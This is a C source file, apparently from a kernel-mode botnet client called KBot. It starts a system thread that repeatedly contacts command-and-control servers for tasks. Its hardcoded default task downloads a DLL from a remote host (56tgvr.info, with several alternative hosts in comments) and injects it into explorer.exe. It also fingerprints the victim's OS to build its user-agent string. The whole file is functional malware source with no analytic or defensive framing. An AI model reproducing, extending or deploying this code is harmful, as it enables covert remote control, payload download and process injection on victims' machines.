//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KBot project.
//	
// module: kbot.c
// $Revision: 32 $
// $Date: 2012-07-04 15:11:26 +0400 (Ср, 04 июл 2012) $
// description: 
//	Kernel-mode client program.
//	Connects over the KIP to one of the specified C&C servers and receives specially formed configuration files and commands.

#include <Ntifs.h>
#include <ntddk.h>
#include <ntimage.h>
#define NTSTRSAFE_NO_DEPRECATE
#include <ntstrsafe.h>

#include "version.h"
#include "ntddkex.h"
#include "kdbg.h"
#include "bklib.h"

#include "..\bkdrv\bkdrv.h"
#include "..\bklib\fssup.h"
#include "..\fslib\vfat.h"
#include "..\fslib\fslib.h"

#include "inaddr.h"
#include "..\inc\kipapi.h"
#include "..\khttp\khttp.h"

#include "..\kiplib\kstream.h"

#include "joiner.h"
#include "kbot.h"
#include "kbotinc.h"


//#define	szDefaultTask	"LOAD_FILE http://shaparack.com/img/admin/bot.plug BT.DLL\r\nSET_INJECT BT.DLL explorer.exe\r\n"
//#define	szDefaultTask	"LOAD_FILE http://56tgvr.info/geter/getFile.php BT1.DLL\r\nLOAD_FILE http://56tgvr.info/geter/bot.plug BT.DLL\r\nSET_INJECT BT.DLL explorer.exe\r\n"
#define	szDefaultTask	"LOAD_FILE http://56tgvr.info/geter/getFile.php BT.DLL\r\nSET_INJECT BT.DLL explorer.exe\r\n"
//#define	szDefaultTask	"LOAD_FILE http://az2.zika.in/rt_jar/bot.plug BT.DLL\r\nSET_INJECT BT.DLL explorer.exe\r\n"
//#define	szDefaultTask	"LOAD_FILE http://security-checking.org/rt_jar/bot.plug BT.DLL\r\nSET_INJECT BT.DLL explorer.exe\r\n"

KEVENT			g_KBotShutdownEvent = {0};
PCHAR			g_KbotPublicKey = NULL;
PCHAR			g_KbotUserAgent = NULL;

VOID __stdcall AppFree(PVOID pMem);
PVOID __stdcall AppAlloc(ULONG	Size);

PVOID	KBotAlloc(ULONG	Size)
{
	return(MyAllocatePool(PagedPool, Size));
}

VOID	KBotFree(PVOID	Mem)
{
	MyFreePool(Mem);
}

// ---- Following routines are used by CRYPTO library ---------------------------------------------------------------------

ULONG	__stdcall AppRand(VOID)
{
	LARGE_INTEGER TickCount;
	KeQueryTickCount(&TickCount);
	return(TickCount.LowPart);
}
// --------------------------------------------------------------------------------------------------------------------------



ULONG	KBotSelectHost(ULONG OldIndex)
{
	if (OldIndex == g_KBotConfig->HostIndex)
	{
		g_KBotConfig->HostIndex += 1;
		if (g_KBotConfig->HostIndex == g_KBotConfig->HostCount)
			g_KBotConfig->HostIndex = 0;
	}
	return(g_KBotConfig->HostIndex);
}

//
//	Thread function.
//	Requests config and task by a timer in a loop.
//
VOID	KBotMainThread(PVOID Context)
{
	KTIMER	TaskTimer;
	PVOID	WaitObjects[3] = {&g_KBotShutdownEvent, &TaskTimer};
	NTSTATUS	ntStatus;
	LARGE_INTEGER	Period;
	ANSI_STRING		aConfigName = RTL_CONSTANT_STRING(szKBotConfigFileName);

	ENTER_WORKER();

	KdPrint(("KBOT: main thread started.\n"));

	KeInitializeTimer(&TaskTimer);

	Period.QuadPart = _RELATIVE(_MILLISECONDS(KBOT_WAIT_BEFORE_START));
	KeSetTimer(&TaskTimer, Period, NULL);

	do	// main loop
	{
		PCHAR	Buffer = NULL;
		ULONG	bSize = 0;

		ntStatus = KeWaitForMultipleObjects(2, (PVOID*)&WaitObjects, WaitAny, Executive, KernelMode, FALSE, NULL, NULL);

		if (ntStatus < STATUS_WAIT_1 || ntStatus > STATUS_WAIT_2)
			// g_KBotShutdownEvent signaled or any error occured, exiting
			break;

		if (ntStatus == STATUS_WAIT_1)
		{
			// Task timer expired
			if (NT_SUCCESS(ProcessTaskFile(szDefaultTask, sizeof(szDefaultTask), TRUE)))
				Period.QuadPart = _RELATIVE(_SECONDS(g_KBotConfig->TaskPeriod));
			else
				Period.QuadPart = _RELATIVE(_SECONDS(g_KBotConfig->MinimumPeriod));

			KeSetTimer(&TaskTimer, Period, NULL);
		}

	} while(TRUE);

	LEAVE_WORKER();

	UNREFERENCED_PARAMETER(Context);
}

//
//	Initializes KBOT user-agent string used in HTTP requests.
//	This string contains machine architecture, OS version and default browser.
//
BOOL KBotInitUserAgent(VOID)
{
	BOOL	Ret = FALSE;
	ULONG	i, OsMajorVersion, OsMinorVersion, OsBuildNumber;
	PCHAR	pArch = "";

	if (g_KbotUserAgent = KBotAlloc(cstrlenA(szUserAgentFmt) + cstrlenA(szX64) + 8))
	{
		PsGetVersion(&OsMajorVersion, &OsMinorVersion, &OsBuildNumber, NULL);
#ifdef _WIN64
		pArch = szX64;
#endif
		i = sprintf(g_KbotUserAgent, szUserAgentFmt, OsMajorVersion, OsMinorVersion, pArch);
		ASSERT(i < (cstrlenA(szUserAgentFmt) + cstrlenA(szX64) + 8));

		Ret = TRUE;
	}
	return(Ret);
}



// ---- Startup and clenup ---------------------------------------------------------------------------------------------------

VOID		KBotCleanup(VOID)
{
	// Check if g_KBotShutdownEvent initialized...
	if (g_KBotShutdownEvent.Header.Type)
		// ...then set it to notify all workers
		KeSetEvent(&g_KBotShutdownEvent, IO_NO_INCREMENT, FALSE);

	if (g_KbotPublicKey)
		AppFree(g_KbotPublicKey);

	if (g_KbotUserAgent)
		KBotFree(g_KbotUserAgent);
}


NTSTATUS	KBotStartup(VOID)
{
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	HANDLE		hThread;
	ULONG		Size;
	OBJECT_ATTRIBUTES	oa = {0};

	KdPrint(("KBOT version 1.0 started.\n"));

	do	// not a loop
	{
		if (!KBotInitUserAgent())
			break;

		// Initializing HTTP client
		if (!KHttpInit(&KBotAlloc, &KBotFree))
			break;
	
		// Initializing g_KBotShutdownEvent
		KeInitializeEvent(&g_KBotShutdownEvent, NotificationEvent, FALSE);

		if (!GetJoinedData((PIMAGE_DOS_HEADER)BkImageBase, &g_KbotPublicKey, &Size, FALSE, CRC_PUBLIC_KEY, 0))
			g_KbotPublicKey = NULL;

		// Loading or creating user ID
		KBotGetUserId();

		// Loading or initializing config
		if (!(NT_SUCCESS(ntStatus = KBotLoadConfig())))
			break;

		// Initializing and starting client main thread
		InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
		ntStatus = PsCreateSystemThread(&hThread, GENERIC_ALL, &oa, NULL, NULL, &KBotMainThread, NULL);

		if (NT_SUCCESS(ntStatus))
			ZwClose(hThread);
		
	} while(FALSE);

	KdPrint(("KBOT: startup complete with status 0x%X\n", ntStatus));

	if (!(NT_SUCCESS(ntStatus)))
		KBotCleanup();

	return(ntStatus);
}